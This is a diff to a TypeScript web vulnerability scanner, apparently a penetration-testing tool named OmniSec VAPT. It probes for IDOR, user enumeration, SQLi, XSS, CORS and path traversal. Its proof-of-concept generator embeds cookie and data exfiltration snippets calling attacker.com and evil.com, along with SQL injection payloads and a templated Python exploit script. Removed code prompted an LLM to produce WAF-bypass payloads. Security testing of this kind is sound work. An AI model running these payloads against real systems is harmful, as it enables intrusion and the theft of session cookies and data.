-            poc: `curl -X POST "${endpoint}" -d "username=admin&password=x"\ncurl -X POST "${endpoint}" -d "username=nonexistent99999&password=x"`
+            id: `A07-ENUM-${Date.now()}`, severity: 'medium',
+            title: 'User Enumeration via Error Messages', owasp: 'A07:2021',
+            description: 'Different errors for valid vs invalid usernames.',
+            endpoint, method: 'POST',
+            evidence: 'Different responses', evidence2: 'Username-specific errors',
+            dualConfirmed: true, remediation: 'Return generic errors.',
+            cwe: 'CWE-204', confidence: 82, category: 'auth'
           });
         }
       }
     } catch {}
   }
-
   return findings;
 }
 
 async function testBusinessLogic(target: URL, workflows: string[]): Promise<Finding[]> {
   const findings: Finding[] = [];
   const idorPaths = ['/user/', '/profile/', '/account/', '/order/', '/invoice/', '/document/'];
-
   for (const path of idorPaths) {
     try {
       const [resp1, resp2] = await Promise.all([
@@ -1297,40 +1482,29 @@ async function testBusinessLogic(target: URL, workflows: string[]): Promise<Find
       if (resp1?.status === 200 && resp2?.status === 200) {
         const body1 = await resp1.text();
         const body2 = await resp2.text();
-        // Only flag if responses are different (different user data)
         if (body1 !== body2 && body1.length > 100) {
           findings.push({
-            id: `IDOR-${Date.now()}`,
-            severity: 'high',
-            title: `IDOR at ${path}`,
-            description: 'Sequential object IDs return different user data without authorization — confirmed IDOR',
-            endpoint: new URL(`${path}1`, target).toString(),
-            method: 'GET',
-            evidence: `${path}1 and ${path}2 both return 200 with different content`,
-            evidence2: 'Response bodies differ confirming separate records — dual-confirmed',
-            dualConfirmed: true,
-            remediation: 'Implement proper authorization checks. Use UUIDs instead of sequential IDs.',
-            cwe: 'CWE-639',
-            cvss: 7.5,
-            mitre: ['T1078'],
-            confidence: 80,
-            poc: `curl "${new URL(`${path}1`, target)}"\ncurl "${new URL(`${path}2`, target)}"`
+            id: `A01-IDOR-${Date.now()}`, severity: 'high',
+            title: `IDOR at ${path}`, owasp: 'A01:2021',
+            description: 'Sequential IDs return different user data without auth.',
+            endpoint: new URL(`${path}1`, target).toString(), method: 'GET',
+            evidence: 'Different responses for /1 and /2', evidence2: 'Confirmed IDOR',
+            dualConfirmed: true, remediation: 'Implement authorization checks. Use UUIDs.',
+            cwe: 'CWE-639', cvss: 7.5, mitre: ['T1078'], confidence: 80, category: 'access_control'
           });
         }
       }
     } catch {}
   }
-
   return findings;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// TARGET FINGERPRINTING
+// FINGERPRINT + LEARNING + AI FUNCTIONS
 // ═══════════════════════════════════════════════════════════════════════════════
 async function fingerprintTarget(target: URL, discovery: any): Promise<any> {
   return {
-    hostname: target.hostname,
-    protocol: target.protocol,
+    hostname: target.hostname, protocol: target.protocol,
     technologies: discovery.technologies || [],
     server: discovery.serverInfo,
     headers: discovery.headers,
@@ -1339,82 +1513,45 @@ async function fingerprintTarget(target: URL, discovery: any): Promise<any> {
     formCount: discovery.forms?.length || 0,
     paramCount: discovery.params?.length || 0,
     shodanVulns: discovery.shodanData?.vulns || [],
-    riskProfile: calculateRiskProfile(discovery)
+    ports: discovery.ports || [],
   };
 }
 
-function calculateRiskProfile(discovery: any): string {
-  let score = 0;
-  if (discovery.shodanData?.vulns?.length > 0) score += 30;
-  if (discovery.forms?.length > 5) score += 10;
-  if (discovery.apiEndpoints?.length > 3) score += 15;
-  if (discovery.endpoints?.some((e: string) => e.includes('.git') || e.includes('.env'))) score += 40;
-  if (score >= 50) return 'critical';
-  if (score >= 30) return 'high';
-  if (score >= 15) return 'medium';
-  return 'low';
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// LEARNING DATA
-// ═══════════════════════════════════════════════════════════════════════════════
 async function getFailedPayloads(supabase: any, hostname: string): Promise<string[]> {
   try {
-    const { data } = await supabase
-      .from('vapt_test_actions')
-      .select('payload_sent')
-      .eq('domain', hostname)
-      .eq('outcome_label', 'blocked')
-      .limit(50);
+    const { data } = await supabase.from('vapt_test_actions')
+      .select('payload_sent').eq('domain', hostname).eq('outcome_label', 'blocked').limit(50);
     return data?.map((d: any) => d.payload_sent).filter(Boolean) || [];
   } catch { return []; }
 }
 
 async function saveLearningData(supabase: any, hostname: string, findings: Finding[]): Promise<void> {
-  // Save in batches to avoid rate limits — only high-confidence dual-confirmed findings go into the training set
   const learnable = findings.filter(f => !f.falsePositive && f.confidence >= 75);
-  console.log(`[AI LEARNING] Saving ${learnable.length} learning data points for ${hostname}`);
-  
-  // Insert in sequential loop to avoid hitting DB limits
   for (const finding of learnable) {
     try {
-      const testType = (finding.id.split('-')[0] || 'vuln').toLowerCase();
-      const outcomeLabel = finding.dualConfirmed ? 'success' : finding.confidence >= 90 ? 'partial' : 'no_effect';
-      
       await supabase.from('vapt_test_actions').insert({
         target_url: finding.endpoint.slice(0, 500),
         domain: hostname,
         method: finding.method || 'GET',
         injection_point: finding.payload ? 'parameter' : null,
-        test_type: testType,
+        test_type: (finding.id.split('-')[0] || 'vuln').toLowerCase(),
         payload_sent: finding.payload?.slice(0, 500) || null,
         transformed_payload: finding.exploitCode?.slice(0, 500) || null,
-        outcome_label: outcomeLabel,
-        response_status: null,
-        notes: `[${finding.confidence}% conf | ${finding.dualConfirmed ? 'DUAL-CONFIRMED' : 'SINGLE'}] ${finding.title} | CWE:${finding.cwe || 'N/A'} CVSS:${finding.cvss || 'N/A'}`.slice(0, 500),
-        embedding_text: `${finding.title} ${finding.description} ${finding.cwe || ''} ${finding.evidence || ''} ${finding.remediation}`.slice(0, 1000),
+        outcome_label: finding.dualConfirmed ? 'success' : finding.confidence >= 90 ? 'partial' : 'no_effect',
+        notes: `[${finding.confidence}% | ${finding.owasp || 'N/A'} | ${finding.dualConfirmed ? 'DUAL' : 'SINGLE'}] ${finding.title}`.slice(0, 500),
+        embedding_text: `${finding.title} ${finding.description} ${finding.cwe || ''} ${finding.owasp || ''} ${finding.evidence || ''}`.slice(0, 1000),
       });
-    } catch (e) {
-      console.log(`Failed to save learning entry for ${finding.title}:`, e);
-    }
+    } catch {}
   }
-  console.log(`[AI LEARNING] Saved ${learnable.length} entries. Model improving...`);
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// AI FUNCTIONS
-// ═══════════════════════════════════════════════════════════════════════════════
 async function performAICorrelation(findings: Finding[], discovery: any, fingerprint: any, apiKey: string | undefined): Promise<any> {
   if (!apiKey || findings.length === 0) {
     return {
-      attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({
-        name: f.title, steps: [f.description], impact: 'Critical'
-      })),
-      chainedExploits: [],
-      recommendations: ['Remediate critical vulnerabilities immediately', 'Implement security headers', 'Enable WAF']
+      attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
+      chainedExploits: [], recommendations: ['Remediate critical findings', 'Implement security headers', 'Enable WAF']
     };
   }
-
   try {
     const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
       method: "POST",
@@ -1422,158 +1559,10 @@ async function performAICorrelation(findings: Finding[], discovery: any, fingerp
       body: JSON.stringify({
         model: "google/gemini-2.5-flash",
         messages: [
-          {
-            role: "system",
-            content: `You are a senior penetration tester. Analyze findings and create attack paths with chained exploits. Return valid JSON only.`
-          },
-          {
-            role: "user",
-            content: `Target: ${fingerprint.hostname}\nTech: ${(fingerprint.technologies || []).join(', ')}\nDual-confirmed findings: ${JSON.stringify(findings.filter(f => f.dualConfirmed).slice(0, 15))}\n\nReturn: {"attackPaths":[{"name":"...","steps":["..."],"impact":"...","mitre":"..."}],"chainedExploits":[{"vulnerabilities":["..."],"exploitation":"...","impact":"..."}],"recommendations":["..."]}`
-          }
+          { role: "system", content: "Senior penetration tester. Analyze findings and create attack chains. Return valid JSON only." },
+          { role: "user", content: `Target: ${fingerprint.hostname}\nTech: ${(fingerprint.technologies || []).join(', ')}\nPorts: ${(fingerprint.ports || []).join(', ')}\nFindings: ${JSON.stringify(findings.filter(f => f.dualConfirmed).slice(0, 15))}\n\nReturn: {"attackPaths":[{"name":"...","steps":["..."],"impact":"...","mitre":"..."}],"chainedExploits":[{"vulnerabilities":["..."],"exploitation":"...","impact":"..."}],"recommendations":["..."]}` }
         ],
         temperature: 0.2
-      }),
-    });
-
-    if (response.ok) {
-      const data = await response.json();
-      const content = data.choices?.[0]?.message?.content || '';
-      const jsonMatch = content.match(/\{[\s\S]*\}/);
-      if (jsonMatch) return JSON.parse(jsonMatch[0]);
-    }
-  } catch (e) { console.log('AI correlation failed:', e); }
-
-  return {
-    attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
-    chainedExploits: [],
-    recommendations: ['Remediate critical vulnerabilities immediately', 'Implement HSTS and CSP', 'Enable WAF']
-  };
-}
-
-async function generateExploitPOC(findings: Finding[], apiKey: string | undefined): Promise<Finding[]> {
-  for (const finding of findings) {
-    // Generate specific, accurate POC based on vuln type
-    if (!finding.poc) {
-      const method = (finding.method || 'GET').toUpperCase();
-      const ep = finding.endpoint;
-      const pl = finding.payload || '';
-
-      if (finding.id.startsWith('CORS')) {
-        finding.poc = `# CORS Misconfiguration Exploit POC
-# Step 1: Verify reflection
-curl -sI -X OPTIONS "${ep}" \\
-  -H "Origin: https://evil.com" \\
-  -H "Access-Control-Request-Method: GET" | grep -i access-control
-
-# Step 2: Exfiltrate data (place on attacker.com)
-fetch("${ep}", {
-  credentials: "include",
-  headers: {"Origin": "https://evil.com"}
-}).then(r => r.text()).then(d => {
-  fetch("https://attacker.com/steal?data=" + btoa(d))
-})`;
-      } else if (finding.id.startsWith('TRAVERSAL') || finding.cwe === 'CWE-22') {
-        finding.poc = `# Directory Traversal Exploit POC
-# Payload: ${pl}
-curl -s "${ep}"
-
-# Verify /etc/passwd content:
-# Expected: root:x:0:0:root:/root:/bin/bash
-# Windows: [extensions] section from win.ini`;
-      } else if (finding.id.startsWith('COOKIE')) {
-        finding.poc = `# Cookie Hijacking via XSS POC
-# Cookie lacks HttpOnly — injectable via any XSS:
-<script>
-  var img = new Image();
-  img.src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
-  document.body.appendChild(img);
-</script>
-# Alternative via fetch:
-fetch("https://attacker.com/steal?c=" + document.cookie)`;
-      } else if (finding.cwe === 'CWE-89' || finding.id.startsWith('SQLI')) {
-        finding.poc = `# SQL Injection Exploit POC
-# Error-based detection:
-curl -s "${ep}${ep.includes('?') ? '&' : '?'}payload=${encodeURIComponent(pl)}"
-
-# Boolean-based bypass:
-curl -s "${ep}${ep.includes('?') ? '&' : '?'}payload=${encodeURIComponent("' OR '1'='1' -- -")}"
-
-# Time-based blind (MySQL):
-curl -s "${ep}${ep.includes('?') ? '&' : '?'}payload=${encodeURIComponent("' AND SLEEP(5) -- -")}"
-# (5-second delay confirms injection)`;
-      } else if (finding.cwe === 'CWE-79' || finding.id.startsWith('XSS')) {
-        finding.poc = `# Reflected XSS POC
-curl -s "${ep}" | grep -o '${pl.slice(0, 30)}.*'
-# Or open in browser:
-# ${ep}
-
-# Session hijack payload:
-# ${ep.replace(pl, "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>")}`;
-      } else {
-        finding.poc = `# ${finding.title}\n# CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}\n# Dual-Confirmed: ${finding.dualConfirmed ? 'YES' : 'NO'}\n\ncurl -X ${method} "${ep}"${pl ? `\n# Payload: ${pl}` : ''}`;
-      }
-    }
-
-    if (!finding.exploitCode) {
-      const method = (finding.method || 'GET').toLowerCase();
-      finding.exploitCode = `#!/usr/bin/env python3
-"""
-OmniSec VAPT - Automated Exploit Script
-Vulnerability: ${finding.title}
-CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}
-Dual-Confirmed: ${finding.dualConfirmed ? 'YES ✓' : 'NO (verify manually)'}
-Confidence: ${finding.confidence}%
-"""
-import requests
-import sys
-
-TARGET = "${finding.endpoint}"
-PAYLOAD = ${JSON.stringify(finding.payload || '')}
-EVIDENCE = "${(finding.evidence || '').replace(/"/g, '\\"').slice(0, 100)}"
-
-def exploit():
-    headers = {"User-Agent": "OmniSec-VAPT/5.0"}
-    
-    try:
-        r = requests.${method}(TARGET, ${finding.method === 'POST' ? 'data={"input": PAYLOAD}, ' : ''}headers=headers, timeout=15, verify=False)
-        print(f"[*] Status: {r.status_code}")
-        print(f"[*] Response length: {len(r.text)}")
-        
-        # Check for vulnerability indicators
-        indicators = [${finding.evidence ? `"${finding.evidence.slice(0,40).replace(/"/g, '\\"')}"` : '""'}]
-        for ind in indicators:
-            if ind and ind.lower() in r.text.lower():
-                print(f"[+] CONFIRMED: {ind}")
-                return True
-        
-        print("[-] Not confirmed in this run")
-        return False
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        return False
-
-if __name__ == "__main__":
-    print(f"[*] Testing: {TARGET}")
-    result = exploit()
-    sys.exit(0 if result else 1)
-`;
-    }
-  }
-  return findings;
-}
-
-async function generateAIPayloads(apiKey: string, failedPayloads: string[], target: string): Promise<any> {
-  try {
-    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
-      method: "POST",
-      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
-      body: JSON.stringify({
-        model: "google/gemini-2.5-flash",
-        messages: [
-          { role: "system", content: "Security researcher generating WAF-bypass payloads. Return JSON only." },
-          { role: "user", content: `Target: ${target}\nBlocked: ${failedPayloads.slice(0, 10).join(', ')}\n\nGenerate 5 NEW bypass payloads per category. Return: {"xss":[...],"sqli":[...],"ssrf":[...],"lfi":[...]}` }
-        ],
-        temperature: 0.7
       }),
     });
     if (response.ok) {
@@ -1583,7 +1572,59 @@ async function generateAIPayloads(apiKey: string, failedPayloads: string[], targ
       if (jsonMatch) return JSON.parse(jsonMatch[0]);
     }
   } catch {}
-  return null;
+  return {
+    attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
+    chainedExploits: [], recommendations: ['Remediate critical vulnerabilities', 'Implement HSTS and CSP']
+  };
+}
+
+async function generateExploitPOC(findings: Finding[], fingerprint: any): Promise<Finding[]> {
+  for (const finding of findings) {
+    if (!finding.poc) {
+      const ep = finding.endpoint;
+      const pl = finding.payload || '';
+      const method = (finding.method || 'GET').toUpperCase();
+
+      if (finding.category === 'cors') {
+        finding.poc = `# CORS Exploit POC\ncurl -sI "${ep}" -H "Origin: https://evil.com" | grep -i access-control\n\n# Exfiltrate:\nfetch("${ep}",{credentials:"include",headers:{"Origin":"https://evil.com"}}).then(r=>r.text()).then(d=>fetch("https://attacker.com/steal?d="+btoa(d)))`;
+      } else if (finding.category === 'traversal') {
+        finding.poc = `# Path Traversal POC\ncurl -s "${ep}"\n# Expected: root:x:0:0:root:/root:/bin/bash`;
+      } else if (finding.category === 'cookie') {
+        finding.poc = `# Cookie Theft via XSS\n<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`;
+      } else if (finding.cwe === 'CWE-89') {
+        finding.poc = `# SQLi POC\ncurl -s "${ep}"\n\n# Boolean bypass:\ncurl -s "${ep.replace(encodeURIComponent(pl), encodeURIComponent("' OR '1'='1' -- -"))}"\n\n# Time-based blind:\ncurl -s "${ep.replace(encodeURIComponent(pl), encodeURIComponent("' AND SLEEP(5) -- -"))}"`;
+      } else if (finding.cwe === 'CWE-79') {
+        finding.poc = `# XSS POC\ncurl -s "${ep}" | grep -o 'onerror=.*'\n\n# Browser: open ${ep}`;
+      } else {
+        finding.poc = `# ${finding.title}\n# ${finding.owasp || ''} | CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}\ncurl -X ${method} "${ep}"${pl ? `\n# Payload: ${pl}` : ''}`;
+      }
+    }
+
+    if (!finding.exploitCode) {
+      finding.exploitCode = `#!/usr/bin/env python3
+"""OmniSec VAPT v6 - ${finding.title}
+${finding.owasp || ''} | CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}
+Dual-Confirmed: ${finding.dualConfirmed ? 'YES' : 'NO'} | Confidence: ${finding.confidence}%
+"""
+import requests, sys
+TARGET = "${finding.endpoint}"
+PAYLOAD = ${JSON.stringify(finding.payload || '')}
+
+def exploit():
+    try:
+        r = requests.${(finding.method || 'get').toLowerCase()}(TARGET, headers={"User-Agent":"OmniSec/6.0"}, timeout=15, verify=False)
+        print(f"Status: {r.status_code}, Length: {len(r.text)}")
+        return r.status_code < 500
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+if __name__ == "__main__":
+    exploit()
+`;
+    }
+  }
+  return findings;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1596,7 +1637,7 @@ async function fetchWithTimeout(url: string, timeout: number, options?: RequestI
     const response = await fetch(url, {
       ...options,
       signal: controller.signal,
-      headers: { "User-Agent": "OmniSec Autonomous VAPT/4.0", ...(options?.headers || {}) }
+      headers: { "User-Agent": "OmniSec Autonomous VAPT/6.0", ...(options?.headers || {}) }
     });
     clearTimeout(timeoutId);
     return response;
